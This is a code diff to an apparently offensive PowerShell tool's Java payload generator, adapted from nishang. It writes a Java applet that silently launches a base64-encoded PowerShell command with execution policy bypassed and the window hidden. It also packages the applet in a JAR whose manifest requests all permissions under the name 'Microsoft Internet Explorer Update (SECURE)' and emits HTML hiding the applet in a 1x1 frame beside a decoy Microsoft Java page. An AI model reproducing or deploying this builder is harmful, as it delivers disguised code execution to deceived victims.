@@ -734,42 +734,39 @@ if (Test-Path "C:\program files\java\") {
 # taken from nishang Out-Java
 function CreateJavaPayloadTrue
 {
-
-$OutputPath = "$global:newdir\payloads"
+cd "$global:newdir\payloads"
+$OutputPath="$pwd"
 $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
 $payloadraw = [Convert]::ToBase64String($bytes)
 
-# Java code taken from the Social Enginnering Toolkit (SET) by David Kennedy
 $JavaClass = @"
 import java.applet.*;
 import java.awt.*;
 import java.io.*;
 public class JavaPS extends Applet {
-public void init() {
-Process f;
-//https://stackoverflow.com/questions/4748673/how-can-i-check-the-bitness-of-my-os-using-java-j2se-not-os-arch/5940770#5940770
-String arch = System.getenv("PROCESSOR_ARCHITECTURE");
-String wow64Arch = System.getenv("PROCESSOR_ARCHITEW6432");
-String realArch = arch.endsWith("64") || wow64Arch != null && wow64Arch.endsWith("64") ? "64" : "32";
-String cmd = "powershell.exe -exec bypass -WindowStyle Hidden -nologo -Noninteractive -noprofile -e $payloadraw";
-//Remove the below if condition to use 64 bit powershell on 64 bit machines.
-if (realArch == "64")
-{
-    cmd = "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass -WindowStyle Hidden -Noninteractive -nologo -noprofile -e $payloadraw";
-}
+public static void foobar() {
+Process a;
+String b = "powershell.exe -exec bypass -WindowStyle Hidden -nologo -Noninteractive -noprofile -e $payloadraw";
 try {
-f = Runtime.getRuntime().exec(cmd);
+System.out.println("Running Java");
+a = Runtime.getRuntime().exec(b);
 }
 catch(IOException e) {
+System.out.println(e);
 e.printStackTrace();
 }
-Process s;
+}
+public static void main(String[] args) {
+foobar();
+}
+public void init() {
+foobar();
 }
 }
 "@
 
 # compile the Java file
-$JavaFile = "$OutputPath\JavaPS.java"
+$JavaFile = "JavaPS.java"
 Out-File -InputObject $JavaClass -Encoding ascii -FilePath $JavaFile
 
 $JavacPath = "$JDKPath" + "\bin\javac.exe"
@@ -780,14 +777,15 @@ $Manifest = @"
 Permissions: all-permissions
 Codebase: *
 Application-Name: Microsoft Internet Explorer Update (SECURE)
+Main-Class: JavaPS
 "@
 
-$ManifestFile = "$OutputPath\manifest.txt"
+$ManifestFile = "manifest.txt"
 Out-File -InputObject $Manifest -Encoding ascii -FilePath $ManifestFile
 
 # create the JAR
 $Jarpath = "$JDKPath" + "\bin\jar.exe"
-& "$JarPath" "-cvfm" "$global:newdir\payloads\JavaPS.jar" "$ManifestFile" "$global:newdir\payloads\JavaPS.class"|out-null
+& "$JarPath" "-cvfm" "$global:newdir\payloads\JavaPS.jar" "$ManifestFile" "JavaPS.class"|out-null
    
 # output simple html. This could be used with any cloned web page.
 # host this HTML and SignedJarPS.jar on a web server.
@@ -795,17 +793,15 @@ $HTMLCode = @'
 <div> 
 <object type="text/html" data="https://windows.microsoft.com/en-IN/internet-explorer/install-java" width="100%" height="100%">
 </object></div>
-<applet code="JavaPS" width="1" height="1" archive="JavaPS.jar" > </applet>'
+<applet code="JavaPS" width="1" height="1" archive="JavaPS.jar"></applet>'
 '@
 $HTMLFile = "$global:newdir\payloads\applet.html"
 Out-File -InputObject $HTMLCode -Encoding ascii -FilePath $HTMLFile   
 
-# cleanup
-Remove-Item "$OutputPath\JavaPS.java"
-Remove-Item "$OutputPath\JavaPS.class"
-  
 # cleanup to remove temporary files
-Remove-Item "$OutputPath\manifest.txt"
+Remove-Item "$global:newdir\payloads\JavaPS.java"
+Remove-Item "$global:newdir\payloads\JavaPS.class"
+Remove-Item "$global:newdir\payloads\manifest.txt"
 Write-Host -Object "Java Payload written to: $global:newdir\JavaPS.jar and applet.html"  -ForegroundColor Green
 }
 
